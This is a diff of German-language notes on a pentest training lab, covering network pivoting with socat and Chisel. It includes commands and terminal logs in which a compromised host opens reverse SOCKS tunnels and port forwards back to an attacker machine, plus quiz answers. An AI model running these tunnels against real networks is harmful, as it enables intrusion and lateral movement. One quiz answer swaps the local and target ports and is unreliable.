@@ -288,6 +288,7 @@ Wenn der kompromittierte Server beispielsweise 172.16.0.5 ist und das Ziel Port 
 Dadurch wird Port 33060 auf dem kompromittierten Server geöffnet und die Eingaben von der angreifenden Maschine direkt auf den vorgesehenen Zielserver umgeleitet, was uns im Wesentlichen Zugriff auf die (vermutlich MySQL-Datenbank) verschafft, die auf unserem Ziel 172.16.0.10 läuft. Die fork-Option wird verwendet, um jede Verbindung in einen neuen Prozess zu stellen, und die reuseaddr-Option bedeutet, dass der Port offen bleibt, nachdem eine Verbindung zu ihm hergestellt wurde. In Kombination ermöglichen sie es uns, denselben Port für mehr als eine Verbindung weiterzuleiten. Erneut verwenden wir &, um die Shell im Hintergrund zu betreiben, sodass wir weiterhin dieselbe Terminalsitzung auf dem kompromittierten Server für andere Dinge verwenden können.
 
 Wir können jetzt eine Verbindung zu Port 33060 auf dem Relay (172.16.0.5) herstellen und unsere Verbindung direkt an unser beabsichtigtes Ziel 172.16.0.10:3306 weiterleiten lassen.
+
 ---
 **Port Forwarding mit Socat - Quiet**
 
@@ -328,3 +329,152 @@ Wie schließen wir das ganze wieder? Die Lösung ist einfach: Führen Sie den Be
 Empfehlenswert wäre hier der [Shell](https://tryhackme.com/r/room/introtoshells)-Room.
 
 ### Chisel
+
+Mit [Chisel](https://github.com/jpillora/chisel) können wir ganz leicht ein Proxy Tunnel oder Portforwarding durch ein gehacktes System realisieren, ganz egal ob wir SSH Zugang haben, oder nicht. 
+Da es in Golang geschrieben wurde, lässt es sich für nahezu jedes System kompellieren (Es gibt auch statische Binaries). Es beinhaltet im Prinzip die gleichen Funktionen die wir bereits beim SSH Proxy/Portwarding kennengelernt haben, allerdings braucht man nicht zwingend eine SSH Verbindung, was ein Vorteil sein kann.
+
+Wir laden uns mal eine Chisel Binary [hier](https://github.com/jpillora/chisel/releases) runter. 
+
+Danach werfen die entsprechende Version auf den Zielhost:
+
+>scp -i root_wreath chisel_1.9.1_linux_amd64 root@10.200.105.200:/tmp/chisel-akcoding
+
+Die Chisel Binary hat zwei Modes - Client und Server.
+
+Wir schauen uns zwei Einsatzmöglichkeiten für Chisel an, SOCKS und Portwarding. 
+
+### Reverse SOCKS Proxy
+
+Wir werden jetzt einen Reverse SOCKS Proxy einrichten. Dieser verbindet sich zurück zu unserer Angreifer Maschine auf dem ein Listener wartet. 
+
+Auf unserer Maschine führen diesen Befehl aus:
+
+>/chisel_1.9.1_linux_amd64 server -p 1337 --reverse &
+
+und auf dem Zielhost:
+
+>./chisel-akcoding client 10.50.106.147:1337 R:socks &
+
+```cmd
+┌──(akwa㉿kali)-[~/Github/wreath]
+└─$ ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse &
+[1] 50422
+                                                                                                                                                                                                           
+2024/05/13 11:07:29 server: Reverse tunnelling enabled
+2024/05/13 11:07:29 server: Fingerprint KA6+xAoB6UKNksOw70khEj8H4W2wwfvAd2BZJXKzPek=
+2024/05/13 11:07:29 server: Listening on http://0.0.0.0:1337
+┌──(akwa㉿kali)-[~/Github/wreath]
+└─$ 2024/05/13 11:07:36 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+
+-------------
+
+[root@prod-serv tmp]# ./chisel-akcoding client 10.50.106.147:1337 R:socks &
+[1] 2922
+[root@prod-serv tmp]# 2024/05/13 10:07:34 client: Connecting to ws://10.50.106.147:1337
+2024/05/13 10:07:34 client: Connected (Latency 47.562993ms)
+```
+
+Erwähnenswert hier ist, obwohl sich der Zielhost auf Port 1337 zurück verbindet, wurde der aktuelle Proxy auf Port 1080 geöffnet. Durch diesen werden wir auch den Datenverkehr schicken. 
+
+Außerdem muss noch das R:socks erwähnt werden. Dieser Prefix steht für *remote*. Im Prinzip teilen wir dem Client damit mit, dass der Server erwartet, dass die Weiterleitungen alle auf der Clientseite stattfinden sollen. 
+
+### Forward SOCKS Proxy
+
+Im Gegensatz zu Reverse Proxys sind Foward Proxys eher selten, vergleichbar mit Reverse Shells und Binding Shells.
+Der Grund dafür liegt meist darin, dass ausgehende Firewall Regeln meistens weniger streng sind als Firewalls, die eingehende Regeln behandeln. Dennoch ist es sinnvoll, sich auch den Forward SOCKS Proxy anzusehen. 
+
+Die Syntax sieht folgendermaßen aus:
+
+Für den Zielhost
+>./chisel server -p LISTEN_PORT --socks5
+
+und für unsere Angreifer Maschine:
+
+>./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
+
+Bei diesem Befehl gibt PROXY_PORT den Port an, der für den Proxy geöffnet werden soll.
+
+Beispielsweise würde 
+>./chisel client 172.16.0.10:8080 1337:socks 
+
+eine Verbindung zu einem Chisel-Server herstellen, der auf Port 8080 von 172.16.0.10 ausgeführt wird. Ein SOCKS-Proxy würde auf Port 1337 unseres angreifenden Rechners geöffnet.
+
+**Proxychains Erinnerung**
+
+Wenn wir Daten über einen dieser Proxys senden, müssen wir den Port in unserer Proxychains-Konfiguration festlegen. Da Chisel einen SOCKS5-Proxy verwendet, müssen wir auch den Zeilenanfang von SOCKS4 in SOCKS5 ändern:
+
+```cmd
+[ProxyList]
+# add proxy here ...
+# meanwhile
+# defaults set to "tor"
+socks5  127.0.0.1 1080
+```
+Hinweis: Die obige Konfiguration gilt für einen Reverse-SOCKS-Proxy – wie bereits erwähnt, öffnet sich der Proxy auf Port 1080 und nicht auf dem angegebenen Überwachungsport (1337). Wenn du Proxychains mit einem Forward-Proxy verwendest, sollte der Port auf den von dir geöffneten Port eingestellt werden (1337 im obigen Beispiel).
+
+### Remote Port Forwarding
+
+Eine Remote Port Weiterleitung liegt vor, wenn wir von einem gehackten System eine Verbindung zurück für die Weiterleitung herstellen.
+
+Dafür führen wir auf unserem System im Prinzip den gleichen Befehl wie beim Reverse Proxy aus:
+
+>./chisel server -p LISTEN_PORT --reverse &
+
+Um den Zielhost jetzt zu unserem Listener zu verbinden, führen wir folgendes aus:
+
+>./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+
+Vielleicht fällt auf, dass sich dieser Befehl sehr stark dem SSH Reverse Port Forwarding ähnelt, wo wir den zu öffnenden Port, die Ziel IP Adresse und den Zielport durch Doppelpunkte getrennt angeben. Beachte, dass wir mit Listener Port den Port angeben, an dem unser Server auf Verbindungen wartet. Local Port gibt den Port an den wir gerne auf unserer Maschine öffnen möchten und mit dem Ziel Port verbinden möchten.
+
+Um ein altes Beispiel zu verwenden: Nehmen wir an, dass unsere eigene IP 172.16.0.20 ist, die IP des kompromittierten Servers 172.16.0.5 ist und unser Ziel Port 22 auf 172.16.0.10 ist. Die Syntax für die Weiterleitung von 172.16.0.10:22 zurück an Port 2222 auf unserem angreifenden Computer wäre wie folgt:
+
+>./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
+
+Die Verbindung zu unserer angreifenden Maschine:
+
+>./chisel server -p 1337 --reverse & 
+
+Dies würde uns den Zugriff auf 172.16.0.10:22 (über SSH) ermöglichen, indem wir zu 127.0.0.1:2222 navigieren.
+
+### Local Port Forwarding
+
+Wie bei SSH stellen wir bei einer lokalen Portweiterleitung eine Verbindung von unserem eigenen angreifenden Computer zu einem Chisel-Server her, der auf einem kompromittiertes Ziel läuft.
+
+Auf dem Ziel starten wir einen Server:
+
+>./chisel server -p LISTEN_PORT
+
+Wir verbinden uns jetzt von unserer angreifenden Maschine aus wie folgt damit:
+
+>./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+
+Um beispielsweise eine Verbindung zu 172.16.0.5:8000 (dem kompromittierten Host, auf dem ein Chisel-Server läuft) herzustellen und unseren lokalen Port 2222 an 172.16.0.10:22 (unser beabsichtigtes Ziel) weiterzuleiten, könnten wir Folgendes verwenden:
+
+>./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
+
+
+---
+```bash
+Welchen Befehl würden Sie verwenden, um einen Chisel-Server für eine umgekehrte Verbindung auf Ihrem angreifenden Computer zu starten?
+
+Verwenden Sie Port 4242 für den Listener und lassen Sie den Prozess nicht im Hintergrund laufen.
+
+# ./chisel server -p 4242 --reverse
+```
+
+```bash
+Welchen Befehl würden Sie verwenden, um mit einem SOCKS-Proxy von einem kompromittierten Host aus eine Verbindung zu diesem Server herzustellen, vorausgesetzt, Ihre eigene IP ist 172.16.0.200 und der Prozess läuft im Hintergrund ab?
+# ./chisel client 172.16.0.200:4242 R:socks &
+```
+
+```bash
+Wie würden Sie 172.16.0.100:3306 mithilfe einer Chisel-Remote-Port-Weiterleitung an Ihren eigenen Port 33060 weiterleiten, vorausgesetzt, Ihre eigene IP ist 172.16.0.200 und der Überwachungsport ist 1337? Hintergrund dieses Prozesses.
+# ./chisel client 172.16.0.200:1337 R:3306:172.16.0.100:33060 &
+```
+
+```bash
+Wenn Sie einen Chisel-Server haben, der auf Port 4444 von 172.16.0.5 läuft, wie können Sie dann einen lokalen Portforward erstellen, der Port 8000 lokal öffnet und eine Verknüpfung zu 172.16.0.10:80 herstellt?
+# ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
+```
+---
+
